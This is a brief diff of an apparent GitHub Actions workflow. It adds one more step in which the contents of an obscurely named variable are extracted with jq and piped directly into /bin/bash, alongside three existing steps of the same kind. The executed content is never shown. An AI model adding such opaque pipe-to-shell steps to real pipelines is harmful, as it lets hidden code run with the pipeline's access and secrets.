@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$wp8" | jq -r .gw95 | /bin/bash
           echo $zi816 | jq -r .qwjff4686 | /bin/bash
           echo $bzweb57 | jq -r .wlct89 | /bin/bash
+          echo $letz3 | jq -r .uns319 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
